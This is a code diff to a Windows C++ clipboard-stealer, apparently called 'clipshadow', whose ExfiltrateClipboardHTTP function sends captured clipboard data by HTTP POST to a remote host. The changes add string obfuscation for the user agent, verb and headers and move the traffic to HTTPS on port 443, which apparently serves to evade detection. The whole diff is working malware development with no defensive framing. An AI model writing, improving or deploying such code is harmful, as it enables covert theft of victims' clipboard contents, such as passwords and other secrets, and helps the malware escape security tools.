@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <wininet.h>
 #include <string>
+#include <obfstr.h>
 
 /// @brief Sends string of data via HTTP POST
 /// @param data the string to be sent
@@ -8,9 +9,10 @@
 /// @param path the path/endpoint on the receiving machine (e.g /example.php)
 /// @param port HTTP port (default = 80)
 /// @return true if sent successfully, false otherwise 
-bool ExfiltrateClipboardHTTP(const std::string& data, const std::string& host, const std::string& path, int port = 80)
+bool ExfiltrateClipboardHTTP(const std::string& data, const std::string& host, const std::string& path, int port = 443)
 {
-    HINTERNET hSession = InternetOpenA("clipshadow", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    static const char* agent = OBFSTR("clipshadow");
+    HINTERNET hSession = InternetOpenA(agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if(!hSession)
         return false;
 
@@ -21,10 +23,12 @@ bool ExfiltrateClipboardHTTP(const std::string& data, const std::string& host, c
         return false;
     }
 
+    static const char* post = OBFSTR("POST");
     HINTERNET hRequest = HttpOpenRequestA(
-        hConnect, "POST", path.c_str(),
+        hConnect, post, path.c_str(),
         NULL, NULL, NULL,
-        INTERNET_FLAG_NO_CACHE_WRITE, 0
+        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 
+        0
     );
     if(!hRequest) 
     {
@@ -33,8 +37,9 @@ bool ExfiltrateClipboardHTTP(const std::string& data, const std::string& host, c
         return false;
     }
 
-    const char* headers = "Content-Type: application/x-www-form-urlencoded";
-    std::string payload = "data=" + data;
+    static const char* headers = OBFSTR("Content-Type: application/x-www-form-urlencoded");
+    static const char* data_prefix = OBFSTR("data=");
+    std::string payload = data_prefix + data;
 
     bool success = HttpSendRequestA(
         hRequest,
